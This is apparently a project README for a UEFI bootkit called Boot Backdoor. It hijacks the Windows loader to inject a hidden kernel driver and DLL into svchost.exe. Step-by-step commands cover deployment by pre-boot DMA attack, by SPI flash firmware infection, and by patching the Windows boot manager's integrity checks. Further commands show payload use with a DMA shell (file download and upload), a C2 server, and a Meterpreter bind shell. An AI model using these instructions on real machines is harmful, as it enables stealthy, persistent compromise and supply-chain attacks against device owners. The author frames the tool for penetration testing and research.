## General information

This repository contains binaries and source code of Boot Backdoor &minus; UEFI DXE driver intended for executing of kernel mode and user mode payloads under the Windows operating system by having an arbitrary code execution at early boot stage during DXE phase of the platform initialization. Backdoor is working by hijacking of Windows Loader `winload.efi` execution flow to inject [its driver](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/driver/driver.cpp) into the loading Windows kernel and then, having kernel mode code execution, backdoor driver injects [user mode loader](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/loader/loader.cpp) into the legitimate `svchost.exe` process running under the local system. Unlike [LoJax](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/) or [Hacking Team UEFI rootkit](https://attack.mitre.org/software/S0047/) this backdoor resides only in memory without dropping of any files on the disk and without creating of any processes, this fact makes its detection way more difficult.

The backdoor can be deployed in various of ways:

 * DMA attack over the PCI Express bus using [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze), also compatible with my other [Xilinx Zynq-7000 based design](https://github.com/Cr4sh/zc_pcie_dma) for DMA attacks. This method can be used with enabled UEFI Secure Boot and Intel Boot Guard.

 * To deploy Boot Backdoor with pre-boot DMA attack you also can use my [Pico DMA project](https://github.com/Cr4sh/pico_dma) &minus; fully autonomous hardware implant for M.2 slot based on PicoEVB development board that can run arbitrary UEFI DXE drivers as payload.

 * UEFI bootkit based on the infection of the platform firmware stored in [SPI flash chip on the motherboard](https://raw.githubusercontent.com/Cr4sh/blog/master/uefi-boot-script-expl/spi-flash-chips.jpg), which is suitable for supply chain attacks. This method can be used with enabled UEFI Secure Boot as well but only on machines without Intel Boot Guard.

 * Windows boot manager image file infection. This method requires initially disabled UEFI Secure Boot but able to work with no physical access to the target machine.

Backdoor supports all 64-bit versions of Windows 7, 8, 8.1, 10 and 11 in UEFI boot mode with disabled [Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) and [Secure Launch](https://learn.microsoft.com/en-us/windows/security/hardware-security/system-guard-secure-launch-and-smm-protection). As payload it can run any kernel driver or DLL image file, for example: [Meterpreter](https://docs.rapid7.com/metasploit/working-with-payloads/) along with any others [Metasploit framework](https://www.metasploit.com/) payloads, [Micro Backdoor](https://github.com/Cr4sh/MicroBackdoor) or [DMA Shell](#using-boot-backdoor-with-dma-shell-payload).

Variety of payloads and deployment methods makes Boot Backdoor suitable for penetration testing (as method of persistence), DMA attacks, supply chain attacks and research purposes.

Here you can see some demo of Boot Backdoor + DMA Shell in action, [Xilinx ZC706 evaluation kit](https://github.com/Cr4sh/zc_pcie_dma) was used as rogue PCI-E device to perform pre-boot DMA attack:

## Deploying the backdoor using pre-boot DMA attack

Python program `uefi_backdoor_boot.py` injects UEFI DXE driver of Boot Backdoor located in `payloads/DmaBackdoorBoot` folder into the target system boot sequence using pre-boot DMA attack described in "Practical DMA attacks" section of the [PCI Express DIY hacking toolkit documentation](https://github.com/Cr4sh/s6_pcie_microblaze#practical-dma-attacks). To use this program you have to perform the following steps:

 1) Power off the target computer.

 2) Connect your FPGA board used for DMA attacks to the PCI-E (or Mini PCI-E, or M.2) port of the target computer.

 3) Turn the board on and ensure that its firmware was successfully initialized. 

 4) Run the following command to start pre-boot DMA attack: 

```
$ ./uefi_backdoor_boot.py 
```

 5) Power on the target computer, in case of successful attack after the couple of seconds you will see red debug messages screen of injected UEFI DXE driver.

An example of `uefi_backdoor_boot.py` console output after the successful attack:

```
$ ./uefi_backdoor_boot.py

              Image base: 0x0086a000
 OslArchTransferToKernel: 0x009c4b20

[+] DONE
```

You can use `--driver` option of `uefi_backdoor_boot.py` to specify an alternative UEFI DXE driver to inject, by default the program uses `payloads/DmaBackdoorBoot/DmaBackdoorBoot_X64.efi` driver. To specify Boot Backdoor payload you can use `--payload` option, its argument is a file path to the kernel driver or DLL image.

After the backdoor was loaded you can use `--debug-output` option to get debug messages of its UEFI DXE driver and print them into the stdout:

```
$ ./uefi_backdoor_boot.py --debug-output
[+] PCI-E link with target is up
[+] Debug output buffer address is 0x79da2000

```

Boot Backdoor kernel driver and user mode loader DLL are also printing various debug messages into the standard Windows debug output using `DbgPrint()` and `OutputDebugString()` functions. You can monitor this messages with [kernel debugger](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-kernel-mode-debugging-in-windbg--cdb--or-ntsd) or [DebugView utility](https://docs.microsoft.com/en-us/sysinternals/downloads/debugview).

## Deploying the backdoor using firmware flash image infection

To infect platform firmware stored in the flash chip on the motherboard you will need some SPI flash programmer, I prefer to use cheap and widely available [FT2232H Mini Module](https://www.ftdichip.com/Support/Documents/DataSheets/Modules/DS_FT2232H_Mini_Module.pdf) from FTDI. Also, there's a [board called Tigrad](https://www.crowdsupply.com/securinghw/tigard) &minus; multi-protocol, multi-voltage tool for hardware hacking that can work as SPI flash programmer. In addition to the programmer you also will need the following tools:

 * [UEFITool](https://github.com/LongSoft/UEFITool/releases/tag/0.28.0) utility to parse and edit UEFI flash images

 * [Flashrom](https://github.com/flashrom/flashrom/releases/tag/v1.2) utility to work with SPI flash programmer

 * SOIC8 [test clip](https://www.sparkfun.com/products/13153) or [probe hook](https://www.sparkfun.com/products/9741) clips kit to connect programmer to the flash chip without its desoldering

First of all, you have to disassemble the machine and locate SPI flash chip with platform firmware. Usually, it's [W25Q64](https://www.winbond.com/resource-files/w25q64fv%20revq%2006142016.pdf) or [W25Q128](https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf) Windbond NOR flash in SOIC8 package:

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/spi_motherboard.jpg" width="760">

Then you have to connect the chip to the FT2232H Mini Module. It’s more convenient to use SOIC8 test clip than probe hook clips, but very often there’s not enough free space around the chip to place test clip. Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/spi_wiring.png" width="542">

Now you can read flash chip contents using Flashrom:

```
> flashrom -p ft2232_spi:type=2232H,port=A –r firmware.bin
```

After that you need to open dumped firmware in UEFITool, locate arbitrary UEFI DXE driver to infect and extract its PE32 image section from the firmware image:

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/uefi_tool.png" width="721">

For example, I picked `Bds.efi` DXE driver responsible for boot device selection as pretty much suitable one. Then you can infect extracted driver with Boot Backdoor using `infector.py` program:

```
> python infector.py --dxe-driver DmaBackdoorBoot_X64.efi --infect Bds.efi --output Bds_infected.efi
```

To specify Boot Backdoor payload you can use `--payload` option of `infector.py`, its argument is a file path of the kernel driver or DLL image.

After that you have to replace original driver image with `Bds_infected.efi` one in UEFITool, save resulting firmware image and flash it back into the chip:

```
> flashrom -p ft2232_spi:type=2232H,port=A –w firmware_infected.bin
```


## Deploying the backdoor using Windows boot manager infection

Windows boot manager image file infection is preferable deployment method to use Boot Backdoor as persistence technique when you don't have any specialized hardware or physical access to the target machine. Unlike previous methods this deployment method requires UEFI Secure Boot disabled.  

To infect Windows Boot Manager you have to perform the following steps.  

Mount EFI system partition where Windows Boot Manager image file is stored:

```
C:\> mountvol S: /S
```

Backup original image file:

```
C:\> copy S:\EFI\Microsoft\Boot\bootmgfw.efi S:\EFI\Microsoft\Boot\bootmgfw_orig.efi
```

Infect original image file with Boot Backdoor:

```
C:\> python .\infector.py --patch-integrity-checks --dxe-driver .\DmaBackdoorBoot_X64.efi ^ 
     --infect S:\EFI\Microsoft\Boot\bootmgfw_orig.efi ^
     --output S:\EFI\Microsoft\Boot\bootmgfw.efi

[+] Target image to infect: S:\EFI\Microsoft\Boot\bootmgfw_orig.efi
[+] DXE driver: .\DmaBackdoorBoot_X64.efi
[+] Output file: S:\EFI\Microsoft\Boot\bootmgfw.efi
Original entry point RVA is 0x0001fbd0
Original .reloc virtual size is 0x00000d80
Original image size is 0x001bf000
Characteristics of .reloc section was changed to RWX
New entry point RVA is 0x001bfe44
New .reloc virtual size is 0x000040a0
New image size is 0x001c20a0
[+] bootmgr!BmFwVerifySelfIntegrity() signature found at offset 0x0002a25c
[+] DONE
```

Unmount EFI system partition:

```
C:\> mountvol S: /D
```

After that you can restart your system, disable Secure Boot in setup menu and boot into the Windows.  

Please pay attention that passing of `--patch-integrity-checks` command line option to the `infector.py` program is mandatory to disable self check of Windows Boot Manager image integrity, in other case it will not able to boot.  

To specify Boot Backdoor payload you can use `--payload` option of `infector.py`, its argument is a file path of the kernel driver or DLL image.


## Using boot backdoor with DMA Shell payload

DMA Shell payload was designed to work with Boot Backdoor specifically for pre-boot DMA attacks use cases. It allows to execute console commands over the rogue PCI-E device, transfer the files and load arbitrary user mode or kernel mode code into the target operating system at the runtime.  

To use Boot Backdoor with DMA Shell there's a separate program `uefi_backdoor_boot_shell.py` that deploys appropriate payload located in `backdoor/dma_shell.dll` and communicates with this payload from the attacker machine using [shared memory channel](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/dma_shell_user/transport.cpp) accessible over the DMA. To use `uefi_backdoor_boot_shell.py` you have to perform the same steps as described in [Deploying the backdoor using pre-boot DMA attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section. Here's an example of `uefi_backdoor_boot_shell.py` output during successful backdoor deployment:

```
$ ./uefi_backdoor_boot_shell.py --command "whoami"

```

Now, when payload was loaded, you can run `uefi_backdoor_boot_shell.py` with `--attach` option to communicate with currently running instance of DMA Shell:

```
$ ./uefi_backdoor_boot_shell.py --attach --command "dir C:\\"
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Payload shared memory region is at 0x00200000
[+] Executing command: dir C:\
[+] Process exit code: 0x00000000

               7 Dir(s)  20,203,184,128 bytes free

```

To pull files from the target system you can use `--download` command line option:

```
$ ./uefi_backdoor_boot_shell.py --attach --download C:\\Windows\\System32\\ntoskrnl.exe --path /tmp/ntoskrnl.exe
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Payload shared memory region is at 0x00200000
[+] Downloading file C:\Windows\System32\ntoskrnl.exe from the target...
[+] 9930552 bytes was written to the /tmp/ntoskrnl.exe
```

To push files to the target system you can use `--upload` command line option:

```
$ ./uefi_backdoor_boot_shell.py --attach --upload DmaBackdoorBoot_X64.efi --path C:\\DmaBackdoorBoot_X64.efi
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Payload shared memory region is at 0x00200000
[+] Uploading file DmaBackdoorBoot_X64.efi to the target...
[+] 62720 bytes was written to the C:\DmaBackdoorBoot_X64.efi
```

To run arbitrary kernel driver or DLL image on the target system you can use `--load` command line option:

```
$ ./uefi_backdoor_boot_shell.py --attach --load some_libray.dll
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Payload shared memory region is at 0x00200000
[+] Loading image file some_libray.dll to the target...
[+] Image was successfully loaded
```

Specified file will be loaded by DMA Shell in file-less way using reflective loader without dropping of any artifacts on the disk.


## Using boot backdoor with Micro Backdoor payload

[Micro Backdoor](https://github.com/Cr4sh/MicroBackdoor) is a simple C2 tool with client and server, it provides basic features like console commands execution and files transfer, it has convenient web interface and small footprint. It was designed to be minimalistic and easy customizable, I'm using it mostly for demonstration purposes as payload for my firmware rootkits and various low level persistence techniques. It's more suitable to use Micro Backdoor payload while deploying Boot Backdoor with [Windows boot manager image file infection](#deploying-the-backdoor-using-windows-boot-manager-infection) (for persistence) or with [firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection) (as part of the supply chain attack), but in this example it will be shown how to use it for pre-boot DMA attacks just like in previous example with DMA Shell.  

First of all, you need to generate RSA key pair used for secure communication between Micro Backdoor client and server:

```
$ cd server
$ ./server.py --keys

Generating "/opt/MicroBackdoor/server/server.key" and "/opt/MicroBackdoor/server/server.crt"
Generating a 2048 bit RSA private key
..................+++
....................+++
writing new private key to '/opt/MicroBackdoor/server/server.key'
-----
```

Then you have to edit `server/config.py` file with various server options, don't forget to change default login and password for accessing its web interface.  

Start the server, you also can use use `--daemon` command line option to run it in the background:

```
$ ./server.py
[05/01/21 03:50:00 AM]: Log file path is "/Users/d_olex/tc/_PoC/MicroBackdoor/server/server.log"
[05/01/21 03:50:00 AM]: Starting backdoor server at address 0.0.0.0:28115
[05/01/21 03:50:00 AM]: server.py PID = 59724, PGID = 59724
[01/May/2021:03:50:00] ENGINE Bus STARTING

[01/May/2021:03:50:01] ENGINE Bus STARTED
```

Now you need to write server configuration into the Micro Backdoor DLL image file using `client_builder.py` program (where `192.168.2.7` is IP address of the host where server is running):

```
./client_builder.py client_amd64_debug.dll 192.168.2.7
Using server address 192.168.2.7:28115
Using server certificate "/Users/d_olex/tc/_PoC/MicroBackdoor/server/server.crt"
45568 bytes readed from "client_amd64_debug.dll"
".conf" section at RVA 0xa800
45568 bytes written into the "client_amd64_debug.dll"
```

Now you can use `uefi_backdoor_boot.py` program with Micro Backdoor payload in the same way as it was described in [Deploying the backdoor using pre-Boot DMA attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section:

```

When operating system startup is complete Boot Backdoor will inject its payload into the system process and you will see new client in the web interface of Micro Backdoor server:

## Using boot backdoor with Meterpreter payload

As it was mentioned above, you can use Boot Backdoor with any payload from the Metasploit framework, for example &minus; Meterpreter. Same as with Micro Backdoor, it's more suitable to use Meterpreter while deploying Boot Backdoor with [Windows boot manager image file infection](#deploying-the-backdoor-using-windows-boot-manager-infection) (for persistence) or with [firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection) (as part of the supply chain attack), but in this example it will be shown how to use it for pre-boot DMA attacks.  

First of all, you need to generate Meterpreter payload as DLL image file with `msfvenom` command, in this example we will use its `bind_tcp` variation:

```
$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -a x64 -f dll -o meterpreter_bind_tcp_4444.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 496 bytes
Final size of dll file: 8704 bytes
Saved as: meterpreter_bind_tcp_4444.dll
```

Please pay attention to the payload architecture, it must match architecture of the target system: i.e., Boot Backdoor can't run 32-bit x86 payloads on 64-bit x86_64 Windows system.  

Now you can use `uefi_backdoor_boot.py` program with Meterpreter payload in the same way as it was described in [Deploying the backdoor using pre-Boot DMA attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section:

```
$ ./uefi_backdoor_boot.py --payload meterpreter_bind_tcp_4444.dll
[+] 8704 bytes of payload image read
[+] 2054 bytes of payload image after the compression

```

When operating system startup is complete Boot Backdoor will inject Meterpreter payload into the `svchost.exe` process running as local system. Now you can connect to the Meterpreter TCP port from `msfconsole` just as usual:

```
$ msfconsole

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.0.42-dev-                         ]
+ -- --=[ 2124 exploits - 1138 auxiliary - 361 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Save the current environment with the
save command, future console restarts will use this
environment again

## Building from the source code

To build user mode and kernel mode components of the backdoor you need Python 2.7.x, Visual Studio 2013 or newer and [Windows Driver Kit 7.1.0](https://www.microsoft.com/en-sg/download/details.aspx?id=11800). Edit WDK folders path in `wdk_dirs.props` and `wdk_dirs_amd64.props` files and then just compile `backdoor.sln` solution in Visual Studio.

After that you can build Boot Backdoor UEFI DXE driver by performing the following steps:

 1. Copy `payloads` subdirectory into the [EDK2](https://github.com/tianocore/edk2) source code directory.

 2. Edit EDK2 `Conf/target.txt` file and set `ACTIVE_PLATFORM` value to `OvmfPkg/OvmfPkgX64.dsc`.

 3. Edit EDK2 `OvmfPkg/OvmfPkgX64.dsc` and add `payloads/DmaBackdoorHv/DmaBackdoorHv.inf` line at the end of the file.

 4. Run Visual Studio Command Prompt and cd to the EDK2 directory.

 5. Run `Edk2Setup.bat --pull` to configure build environment and download required binaries.

 6. Run `cd payloads/DmaBackdoorBoot && nmake` to build DXE driver.

 7. Run `nmake orom` to generate UEFI option ROM.
